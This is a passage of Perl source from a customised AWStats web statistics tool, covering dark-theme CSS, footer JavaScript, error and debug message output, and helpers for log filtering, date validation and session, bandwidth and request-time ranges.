[data-theme="dark"] th[bgcolor="#4477DD"] {
    background-color: var(--color-pages-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#66EEFF"],
[data-theme="dark"] td[bgcolor="#66EEFF"],
[data-theme="dark"] th[bgcolor="#66EEFF"] {
    background-color: var(--color-hits-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#2EA495"],
[data-theme="dark"] td[bgcolor="#2EA495"],
[data-theme="dark"] th[bgcolor="#2EA495"] {
    background-color: var(--color-bandwidth-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#EAEAEA"],
[data-theme="dark"] td[bgcolor="#EAEAEA"] {
    background-color: var(--color-weekend-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#CCCCDD"],
[data-theme="dark"] td[bgcolor="#CCCCDD"] {
    background-color: var(--color-table-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#F6F6F6"],
[data-theme="dark"] td[bgcolor="#F6F6F6"] {
    background-color: var(--header-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] .error-text {
    color: #f87171;
}

[data-theme="dark"] .error-card {
    border-color: #f87171;
}

[data-theme="dark"] .warning-message {
    border-left-color: #fbbf24;
}

[data-theme="dark"] .currentday {
    color: var(--primary-color);
}

.dropdown-item {
    position: relative;
}
.header-right {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
    position: sticky;
    top: 0;
    z-index: 1000;
    background: var(--header-bg);
    padding: 10px 20px;
    border-bottom: 1px solid var(--border-color);
    box-shadow: var(--shadow);
    backdrop-filter: blur(10px);
    background-color: rgba(var(--header-bg-rgb), 0.95);
}
.dropdown-title {
    cursor: pointer;
    padding: 8px 16px;
    background: var(--surface-secondary);
    border: 1px solid var(--border-color);
    border-radius: 30px;
    font-weight: 500;
    color: var(--text-color);
    transition: all 0.2s;
    white-space: nowrap;
    user-select: none;
}

.dropdown-title:hover {
    background: var(--hover-color);
    color: var(--link-color);
    border-color: var(--link-color);
}
.dropdown-menu {
    display: flex;
    gap: 15px;
    position: relative;
    margin-right: auto;
    flex-wrap: wrap;
    z-index: 1001;
}
.dropdown-content {
    display: none;
    position: absolute;
    top: 100%;
    left: 0;
    min-width: max-content;
    background: var(--card-bg);
    border: 1px solid var(--border-color);
    border-radius: 16px;
    padding: 12px;
    box-shadow: var(--shadow);
    z-index: 1000;
    margin-top: 8px;
}

.dropdown-item.active .dropdown-content {
    display: flex;
    flex-direction: column;
    gap: 4px;
}

.dropdown-content a {
    display: block;
    padding: 8px 16px;
    color: var(--text-color);
    text-decoration: none;
    border-radius: 20px;
    transition: all 0.2s;
    font-size: 0.95rem;
    background: var(--surface-secondary);
    border: 1px solid var(--border-color);
}

.dropdown-content a:hover {
    background: var(--hover-color);
    color: var(--link-color);
    border-color: var(--link-color);
    transform: translateX(4px);
}
@media (max-width: 768px) {
    .dropdown-menu {
        display: none;
        position: absolute;
        top: 100%;
        left: 0;
        right: 0;
        background: var(--card-bg);
        flex-direction: column;
        padding: 20px;
        box-shadow: var(--shadow);
        z-index: 1001;
    }
    
    .dropdown-menu.mobile-active {
        display: flex;
    }
    
    .dropdown-item {
        width: 100%;
        margin-bottom: 8px;
    }
    
    .dropdown-title {
        width: 100%;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    
    .dropdown-title::after {
        content: "▼";
        font-size: 0.7rem;
        transition: transform 0.2s;
    }
    
    .dropdown-item.active .dropdown-title::after {
        transform: rotate(180deg);
    }
    
    .dropdown-content {
        position: static;
        width: 100%;
        margin-top: 8px;
        box-shadow: none;
        border: none;
        padding: 8px;
    }
}
</style>
END_CSS
}

#------------------------------------------------------------------------------
# Function:     Write HTML footer
# Parameters:   $listplugins (0/1)
# Input:        %HTMLOutput, $HTMLEndSection, $FrameName, $color_text
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub html_end {
    my $listplugins = shift || 0;
    
    return unless scalar keys %HTMLOutput;
        
    # 插件钩子
    foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyFooter'} } ) {
        my $function = "AddHTMLBodyFooter_$pluginname";
        &$function();
    }

    return unless ( $FrameName ne 'index' && $FrameName ne 'mainleft' );
    
    print "</div> <!-- .aws-container -->\n";
    print "<footer class=\"aws-footer\">\n";
        
    print "<p class=\"footer-line\">\n";
    
    printf("<b>%s %s</b>", _t("Advanced Web Statistics"), $VERSION);
    
    printf(" <br> %s &copy; <span id=\"copyright-year\">1997</span> %s", 
        _t("Copyright"), 
        _t("AWStats Team")
    );
    
	printf(" | %s <a href=\"https://www.awstats.org\" target=\"_blank\" rel=\"noopener\">%s</a>", 
		sprintf(_t("Created by"), "Laurent Destailleur"),
		$PROG
	);
    
    if ($listplugins) {
        my @plugins = keys %{ $PluginsLoaded{'init'} };
        if (@plugins) {
            printf(" (%s: %s)", 
                _t("plugins"), 
                join(', ', @plugins)
            );
        }
    }
    
    print "</p>\n";
    
    print "<p class=\"footer-note-line\">" . _t($HTMLEndSection) . "</p>\n" if $HTMLEndSection;
    
    print "</footer>\n";
    
    print <<'END_SCRIPT';
<script>
document.addEventListener('DOMContentLoaded', function() {
    const customSelect = document.querySelector('.custom-select');
    if (customSelect) {
        const selected = customSelect.querySelector('.select-selected');
        const items = customSelect.querySelectorAll('.select-items div');

        selected.addEventListener('click', function() {
            customSelect.classList.toggle('active');
        });

        items.forEach(item => {
            item.addEventListener('click', function() {
                const value = this.getAttribute('data-value');
                const text = this.textContent;

                selected.textContent = text;
                selected.setAttribute('data-value', value);

                document.getElementById('langSelector').value = value;
                document.getElementById('langSelector').dispatchEvent(new Event('change'));

                customSelect.classList.remove('active');
            });
        });

        document.addEventListener('click', function(e) {
            if (!customSelect.contains(e.target)) {
                customSelect.classList.remove('active');
            }
        });
    }

    const bar = document.getElementById('doc-frame-bar');
    const container = document.getElementById('doc-frame-container');
    const frame = document.getElementById('doc-frame');
    const closeBtn = document.getElementById('doc-frame-close');

    if (frame) {
        frame.addEventListener('load', function() {
            if (this.contentWindow.location.href !== 'about:blank') {
                bar.style.display = 'block';
                container.style.display = 'block';
            }
        });
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            bar.style.display = 'none';
            container.style.display = 'none';
            frame.src = 'about:blank';
        });
    }

    const mobileToggle = document.getElementById('mobileMenuToggle');
    const mobileMenu = document.getElementById('mobileMenu');
    if (mobileToggle && mobileMenu) {
        mobileToggle.addEventListener('click', function() {
            mobileMenu.classList.toggle('mobile-active');
            mobileToggle.innerHTML = mobileMenu.classList.contains('mobile-active') ? '✕' : '☰';
        });
    }

    const dropdownItems = document.querySelectorAll('.dropdown-item');
    document.addEventListener('click', function(event) {
        if (!event.target.closest('.dropdown-item')) {
            dropdownItems.forEach(item => item.classList.remove('active'));
        }
    });
    dropdownItems.forEach(item => {
        const title = item.querySelector('.dropdown-title');
        title.addEventListener('click', function(e) {
            e.stopPropagation();
            dropdownItems.forEach(otherItem => {
                if (otherItem !== item) otherItem.classList.remove('active');
            });
            item.classList.toggle('active');
        });
        const content = item.querySelector('.dropdown-content');
        if (content) {
            content.addEventListener('click', e => e.stopPropagation());
        }
    });
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            dropdownItems.forEach(item => item.classList.remove('active'));
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
	const mobileToggle = document.getElementById('mobileMenuToggle');
	const mobileMenu = document.getElementById('mobileMenu');
	
	if (mobileToggle && mobileMenu) {
		mobileToggle.addEventListener('click', function() {
			mobileMenu.classList.toggle('mobile-active');
			
			if (mobileMenu.classList.contains('mobile-active')) {
				mobileToggle.innerHTML = '✕';
			} else {
				mobileToggle.innerHTML = '☰';
			}
		});
	}
});
(function() {
    const savedTheme = localStorage.getItem('awstats-theme');
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (savedTheme === 'dark' || (!savedTheme && prefersDark)) {
        document.documentElement.setAttribute('data-theme', 'dark');
        updateThemeIcon('dark');
    } else {
        updateThemeIcon('light');
    }
})();

function toggleTheme() {
    const html = document.documentElement;
    const currentTheme = html.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-theme', newTheme);
    localStorage.setItem('awstats-theme', newTheme);
    updateThemeIcon(newTheme);
    try {
        const navFrame = document.getElementById('nav');
        if (navFrame && navFrame.contentWindow) {
            navFrame.contentWindow.postMessage({ theme: newTheme }, '*');
        }
    } catch(e) {}
}

function updateThemeIcon(theme) {
    const btn = document.getElementById('theme-toggle');
    if (btn) {
        btn.innerHTML = theme === 'dark' ? '☀️' : '🌙';
        btn.setAttribute('aria-label',
            theme === 'dark' ? btn.dataset.lightMode : btn.dataset.darkMode
        );
    }
}

window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
    if (!localStorage.getItem('awstats-theme')) {
        const newTheme = e.matches ? 'dark' : 'light';
        document.documentElement.setAttribute('data-theme', newTheme);
        updateThemeIcon(newTheme);
        try {
            const navFrame = document.getElementById('nav');
            if (navFrame && navFrame.contentWindow) {
                navFrame.contentWindow.postMessage({ theme: newTheme }, '*');
            }
        } catch(e) {}
    }
});

(function() {
    const yearSpan = document.getElementById('copyright-year');
    if (yearSpan) {
        const currentYear = new Date().getFullYear();
        yearSpan.textContent = '1997 - ' + currentYear;
    }
})();
</script>
END_SCRIPT
        
        print "</body>\n";
        print "</html>\n";
}
#------------------------------------------------------------------------------
# Function:		Print on stdout tab header of a chart
# Parameters:	$title $tooltipnb [$width percentage of chart title]
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_head {
        my $title     = shift;
        my $tooltipnb = shift;
        my $width     = shift || 70;
        my $class     = shift;

        # 翻译标题
        $title = _t($title);

        # 根据 $class 设置完整的 class 字符串
        my $table_class = "aws-data-table";
        if ($class eq 'hosts' || $class eq 'unknownip') {
                $table_class = "aws-data-table ip-table";
        } elsif ($class eq 'robots') {
                $table_class = "aws-data-table robot-table";
        }

	# Call to plugins' function TabHeadHTML
	my $extra_head_html = '';
	foreach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {
		my $function = "TabHeadHTML_$pluginname";
		$extra_head_html .= &$function($title);
	}

	if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
		print "<table class=\"aws-chart\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"800\">\n";
	} else {
		print "<table class=\"aws-chart\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
	}

	if ($tooltipnb) {
		print "<tr><td class=\"aws-title\" width=\"$width%\""
		  . Tooltip( $tooltipnb, $tooltipnb )
		  . ">$title "
		  . $extra_head_html . "</td>";
	} else {
		print "<tr><td class=\"aws-title\" width=\"$width%\">$title "
		  . $extra_head_html . "</td>";
	}
	print "<td class=\"aws-whitespace\">&nbsp;</td></tr>\n";
	print "<tr><td colspan=\"2\">\n";
        if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
                print "<table class=\"$table_class\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"796\">\n";
        } else {
                print "<table class=\"$table_class\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
        }
}

#------------------------------------------------------------------------------
# Function:		Print on stdout tab ender of a chart
# Parameters:	None
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_end {
	my $string = shift;
	print "</table></td></tr></table>";
	if ($string) {
		# 翻译字符串
		$string = _t($string);
		print "<div class=\"aws-note\">$string</div>\n";
	}
	print "<br />\n\n";
}

#------------------------------------------------------------------------------
# Function:		Write error message and exit
# Parameters:	$message $secondmessage $thirdmessage $donotshowsetupinfo
# Input:		$HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub error {
	my $message = shift || '';
	if ( scalar keys %HTMLOutput ) {
		$message =~ s/\</&lt;/g;
		$message =~ s/\>/&gt;/g;
	}
	my $secondmessage      = shift || '';
	my $thirdmessage       = shift || '';
	my $donotshowsetupinfo = shift || 0;

	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
	if ( !$HeaderHTMLSent && scalar keys %HTMLOutput )   {
		print "<!DOCTYPE html>\n<html><head><meta charset=\"utf-8\">\n";
		print "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
		print get_modern_css('ltr');
		print "</head><body><div class=\"aws-container\">\n";
		$HeaderHTMLSent = 1;
	}
	
	if ($Debug) { debug( "$message $secondmessage $thirdmessage", 1 ); }
	
	my $tagbold     = '<strong>';
	my $tagunbold   = '</strong>';
	my $tagbr       = '<br>';
	my $tagfontred  = '<span class="error-text">';
	my $tagfontgrey = '<span class="info-text">';
	my $tagunfont   = '</span>';
	
	if ( !$ErrorMessages && $message =~ /^Format error$/i ) {

		# Files seems to have bad format
		if ( scalar keys %HTMLOutput )   { print "<div class=\"error-card\">\n"; }
		if ( $message !~ $LogSeparator ) {

			# Bad LogSeparator parameter
			print $tagfontred . _t("AWStats did not found the") . " ${tagbold}LogSeparator${tagunbold} " . _t("in your log records.") . "${tagbr}${tagunfont}\n";
		}
		else {

			# Bad LogFormat parameter
			print "<p>" . _t("AWStats did not find any valid log lines that match your") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter, in the") . " ${NbOfLinesForCorruptedLog}" . _t("th first non commented lines read of your log.") . "</p>\n";
			print $tagfontred . "<p>" . _t("Your log file") . " ${tagbold}$thirdmessage${tagunbold} " . _t("must have a bad format or") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter setup does not match this format.") . "</p>${tagbr}${tagunfont}\n";
			print "<p>" . _t("Your AWStats") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter is:") . "</p>\n";
			print "<pre class=\"code-block\">$LogFormat</pre>\n";
			print "<p>" . _t("This means each line in your web server log file need to have:") . "</p>\n";
			
			if ( $LogFormat == 1 ) {
				print "<p><strong>" . _t("combined log format") . "</strong> " . _t("like this:") . "</p>\n";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 2 ) {
				print "<p><strong>" . _t("MSIE Extended W3C log format") . "</strong> " . _t("like this:") . "</p>\n";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 3 ) {
				print "<p><strong>" . _t("WebStar native log format") . "</strong></p>\n";
			}
			if ( $LogFormat == 4 ) {
				print "<p><strong>" . _t("common log format") . "</strong> " . _t("like this:") . "</p>\n";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 6 ) {
				print "<p><strong>" . _t("Lotus Notes/Lotus Domino") . "</strong> " . _t("like this:") . "</p>\n";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat !~ /^[1-6]$/ ) {
				print "<p>" . _t("the following personalized log format:") . "</p>\n";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "$LogFormat\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			print "<p>" . _t("And this is an example of records AWStats found in your log file (the record number") . " $NbOfLinesForCorruptedLog " . _t("in your log):") . "</p>\n";
			print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
			print "$secondmessage";
			print( scalar keys %HTMLOutput ? "</div>" : "" );
			print "\n";
		}
	}
	else {
		print "<div class=\"error-card\">\n";
		print "<h3>" . _t("Error") . "</h3>\n";
		print "<p>" . ($ErrorMessages ? $ErrorMessages : _t($message)) . "</p>\n";
		print "</div>\n";
	}
	
	if ( !$ErrorMessages && !$donotshowsetupinfo ) {
		print "<div class=\"help-card\">\n";
		print "<h4>" . _t("Troubleshooting") . "</h4>\n";
		
		if ( $message =~ /Couldn.t open config file/i ) {
			my $dir = $DIR;
			if ( $dir =~ /^\./ ) { $dir .= '/../..'; }
			else { $dir =~ s/[\\\/]?wwwroot[\/\\]cgi-bin[\\\/]?//; }
			print "<p>\n";
			if ( $ENV{'GATEWAY_INTERFACE'} ) {
				print "- <strong>" . _t("Did you use the correct URL?") . "</strong><br>\n";
				print _t("Example:") . " http://localhost/awstats/awstats.pl?config=mysite<br>\n";
				print _t("Example:") . " http://127.0.0.1/cgi-bin/awstats.pl?config=mysite<br>\n";
			}
			else {
				print "- <strong>" . _t("Did you use correct config parameter?") . "</strong><br>\n";
				print _t("Example: If your config file is awstats.mysite.conf, use -config=mysite") . "<br>\n";
			}
			print "- <strong>" . _t("Did you create your config file 'awstats.$SiteConfig.conf'?") . "</strong><br>\n";
			print _t("If not, you can run \"awstats_configure.pl\" from command line, or create it manually.") . "<br>\n";
			print "</p>\n";
		}
		else {
			print "<p><strong>" . _t("Setup") . " ("
			  . ( $FileConfig ? "'" . $FileConfig . "'" : "Config" )
			  . ") " . _t("file, web server or permissions may be wrong.") . "</strong></p>\n";
		}
		print "<p>" . _t("Check config file, permissions and AWStats documentation (in 'docs' directory).") . "</p>\n";
		print "</div>\n";
	}

	# Remove lock if not a lock message
	if ( $EnableLockForUpdate && $message !~ /lock file/ ) { &Lock_Update(0); }
	
	if ( scalar keys %HTMLOutput ) { 
		print "</div></body></html>\n"; 
	}
	exit 1;
}
#------------------------------------------------------------------------------
# Function:		Write a warning message
# Parameters:	$message
# Input:		$HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub warning {
	my $messagestring = shift;

	if ($Debug) { debug( "$messagestring", 1 ); }
	
	$messagestring = _t($messagestring);
	
	if ($WarningMessages) {
		if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
		if ( !$HeaderHTMLSent ) { html_head(); }
		if ( scalar keys %HTMLOutput ) {
			$messagestring =~ s,\n,<br>,g;
			print "<div class=\"warning-message\">$messagestring</div>\n";
		} else {
			print "Warning: $messagestring\n";
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Write debug message and exit
# Parameters:   $string $level
# Input:        %HTMLOutput  $Debug=required level  $DEBUGFORCED=required level forced
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub debug {
	my $level = $_[1] || 1;

	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {
		http_head();
	}    # To send the HTTP header and see debug
	if ( $level <= $DEBUGFORCED ) {
		my $debugstring = $_[0];
		if ( !$DebugResetDone ) {
			open( DEBUGFORCEDFILE, "<debug.log" );
			close DEBUGFORCEDFILE;
			chmod 0666, "debug.log";
			$DebugResetDone = 1;
		}
		open( DEBUGFORCEDFILE, ">>debug.log" );
		print DEBUGFORCEDFILE localtime(time)
		  . " - $$ - DEBUG $level - $debugstring\n";
		close DEBUGFORCEDFILE;
	}
	if ( $DebugMessages && $level <= $Debug ) {
		my $debugstring = $_[0];
		if ( scalar keys %HTMLOutput ) {
			$debugstring =~ s/^ /&nbsp;&nbsp; /;
			$debugstring .= "<br>";
		}
		print localtime(time) . " - DEBUG $level - $debugstring\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Optimize an array of precompiled regex by removing duplicate entries
# Parameters:	@Array notcasesensitive=0|1
# Input:        None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub OptimizeArray {
    my ( $array, $notcasesensitive ) = @_;
    my %seen;

    if ($notcasesensitive) {

        # Case insensitive
        my $uncompiled_regex;
        return map {
            $uncompiled_regex = UnCompileRegex($_);
            !$seen{ lc $uncompiled_regex }++ ? qr/$uncompiled_regex/i : ()
        } @$array;
    }

    # Case sensitive
    return map { !$seen{$_}++ ? $_ : () } @$array;
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipDNSLookupFor array
# Parameters:	ip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipDNSLookup {
	foreach (@SkipDNSLookupFor) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipDNSLookupFor
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipHosts array
# Parameters:	host @SkipHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipHost {
	foreach (@SkipHosts) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipReferrers array
# Parameters:	host @SkipReferrers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipReferrer {
	foreach (@SkipReferrers) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipReferrers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipUserAgents array
# Parameters:	useragent @SkipUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipUserAgent {
	foreach (@SkipUserAgents) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipUserAgent
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipFiles array
# Parameters:	url @SkipFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipFile {
	foreach (@SkipFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyHosts array
# Parameters:	host @OnlyHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyHost {
	foreach (@OnlyHosts) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUsers array
# Parameters:	host @OnlyUsers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUser {
	foreach (@OnlyUsers) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyUsers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUserAgents array
# Parameters:	useragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUserAgent {
	foreach (@OnlyUserAgents) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyUserAgents
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in NotPageFiles array
# Parameters:	url @NotPageFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub NotPageFile {
	foreach (@NotPageFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @NotPageFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyFiles array
# Parameters:	url @OnlyFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyFile {
	foreach (@OnlyFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyFiles
}

#------------------------------------------------------------------------------
# Function:     Return day of week of a day
# Parameters:	$day $month $year
# Return:		0-6
#------------------------------------------------------------------------------
sub DayOfWeek {
	my ( $day, $month, $year ) = @_;
	if ($Debug) { debug( "DayOfWeek for $day $month $year", 4 ); }
	if ( $month < 3 ) { $month += 10; $year--; }
	else { $month -= 2; }
	my $cent = sprintf( "%1i", ( $year / 100 ) );
	my $y    = ( $year % 100 );
	my $dw   = (
		sprintf( "%1i", ( 2.6 * $month ) - 0.2 ) + $day + $y +
		  sprintf( "%1i", ( $y / 4 ) ) + sprintf( "%1i", ( $cent / 4 ) ) -
		  ( 2 * $cent ) ) % 7;
	$dw += 7 if ( $dw < 0 );
	if ($Debug) { debug( " is $dw", 4 ); }
	return $dw;
}

#------------------------------------------------------------------------------
# Function:     Return 1 if a date exists
# Parameters:	$day $month $year
# Return:		1 if date exists else 0
#------------------------------------------------------------------------------
sub DateIsValid {
	my ( $day, $month, $year ) = @_;
	if ($Debug) { debug( "DateIsValid for $day $month $year", 4 ); }
	if ( $day < 1 )  { return 0; }
	if ( $day > 31 ) { return 0; }
	if ( $month == 4 || $month == 6 || $month == 9 || $month == 11 ) {
		if ( $day > 30 ) { return 0; }
	}
	elsif ( $month == 2 ) {
		my $leapyear = ( $year % 4 == 0 ? 1 : 0 );   # A leap year every 4 years
		if ( $year % 100 == 0 && $year % 400 != 0 ) {
			$leapyear = 0;
		}    # Except if year is 100x and not 400x
		if ( $day > ( 28 + $leapyear ) ) { return 0; }
	}
	return 1;
}

#------------------------------------------------------------------------------
# Function:     Return string of visit duration
# Parameters:	$starttime $endtime
# Input:        None
# Output:		None
# Return:		A string from $SessionsRange[0..6] that identify the visit duration range
#------------------------------------------------------------------------------
sub GetSessionRange {
	my $param1=shift;
	my $param2=shift;

	# skip unneeded calculations if its the same
	if ($param1 == $param2) { return $SessionsRange[0]; }

	my $starttime;
	my $endtime;

	eval {
		#safety to prevent Time::Local causing termination on invalid data
		#Ex: Second '84' out of range 0..59 at /xxx/awstats.pl
		if ($param1 =~ /$regdate/o) { $starttime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
		if ($param2 =~ /$regdate/o) { $endtime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
	};
	
	my $delay = $endtime - $starttime;
	if ($Debug) {
		debug( "GetSessionRange $endtime - $starttime = $delay", 4 );
	}
	if ( $delay <= 30 )   { return $SessionsRange[0]; }
	if ( $delay <= 120 )  { return $SessionsRange[1]; }
	if ( $delay <= 300 )  { return $SessionsRange[2]; }
	if ( $delay <= 900 )  { return $SessionsRange[3]; }
	if ( $delay <= 1800 ) { return $SessionsRange[4]; }
	if ( $delay <= 3600 ) { return $SessionsRange[5]; }
	return $SessionsRange[6];
}

#------------------------------------------------------------------------------
# Function:     Return string with just the extension of a file in the URL
# Parameters:	$regext, $url without query string
# Input:        None
# Output:		None
# Return:		A lowercase string with the name of the extension, e.g. "html"
#------------------------------------------------------------------------------
sub Get_Extension{
	my $extension;
	my $regext = shift;
	my $urlwithnoquery = shift;
	if ( $urlwithnoquery =~ /$regext/o
		|| ( $urlwithnoquery =~ /[\\\/]$/ && $DefaultFile[0] =~ /$regext/o )
	  )
	{
		$extension =
		  ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )
		  ? lc($1)
		  : 'Unknown';
	}
	else {
		$extension = 'Unknown';
	}	
	return $extension;
}

#------------------------------------------------------------------------------
# Function:     Returns just the file of the url
# Parameters:	-
# Input:        $url
# Output:		String with the file name
# Return:		-
#------------------------------------------------------------------------------
sub Get_Filename{
	my $temp = shift;
	my $idx = -1;
	# check for slash
	$idx = rindex($temp, "/");
	if ($idx > -1){ $temp = substr($temp, $idx+1);}
	else{ 
		$idx = rindex($temp, "\\");
		if ($idx > -1){ $temp = substr($temp, $idx+1);}
	}
	return $temp;
}

#------------------------------------------------------------------------------
# Function:     Return string of Bandwidth Range
# Parameters:   $starttime $endtime
# Input:        None
# Output:       None
# Return:       A string that identify the bandwidth range
#------------------------------------------------------------------------------
sub GetBandwidthRange {
        my $payload = shift;
        if ($Debug) { debug("GetPayloadRange $payload",4); }
        if ($payload <= 44)   { return $PayloadRange[0]; }
        if ($payload <= 100)  { return $PayloadRange[1]; }
        if ($payload <= 500)  { return $PayloadRange[2]; }
        if ($payload <= 1024) { return $PayloadRange[3]; }
        if ($payload <= 2048) { return $PayloadRange[4]; }
        if ($payload <= 5120) { return $PayloadRange[5]; }
        return $PayloadRange[6];
}

#------------------------------------------------------------------------------
# Function:     Return string of Request Time Range
# Parameters:   $starttime $endtime
# Input:        None
# Output:       None
# Return:       A string that identify the time range
#------------------------------------------------------------------------------
sub GetRequestTimeRange {
        my $rqtime = shift;
        if ($Debug) { debug("GetRequestTimeRange $rqtime",4); }
        if ($rqtime <= 44)   { return $TimeRange[0]; }
        if ($rqtime <= 100)  { return $TimeRange[1]; }
        if ($rqtime <= 500)  { return $TimeRange[2]; }
        if ($rqtime <= 1024) { return $TimeRange[3]; }
        if ($rqtime <= 2048) { return $TimeRange[4]; }
        if ($rqtime <= 5120) { return $TimeRange[5]; }
        return $TimeRange[6];
}

#------------------------------------------------------------------------------
# Function:     Compare two browsers version
# Parameters:	$a
# Input:        None
# Output:		None
# Return:		-1, 0, 1
#------------------------------------------------------------------------------
sub SortBrowsers {
	my $a_family = $a;
	my @a_ver    = ();
